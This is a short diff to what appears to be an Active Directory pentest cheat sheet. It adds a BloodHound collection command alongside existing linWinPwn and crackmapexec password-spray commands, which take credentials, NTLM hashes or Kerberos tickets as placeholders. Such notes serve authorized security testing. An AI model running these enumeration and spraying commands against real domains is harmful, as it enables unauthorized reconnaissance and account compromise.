@@ -211,9 +211,15 @@ sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> or <hash_LM:NT]> or <kerbticket[./krb5cc_ticket]> -o <output_dir>
 ```
 
+## Dump for Bloodhuound
+```bash
+./bloodhound.py -c All -u <AD_user> -p <AD_password> -dc  <FQDN_AD_domain_name> -d  <AD_domain_name> -ns <DNS_IP>
+```
+
 ## Password spray
 ### Spray a password on a user list
 ```bash
+
 crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
 ```
 
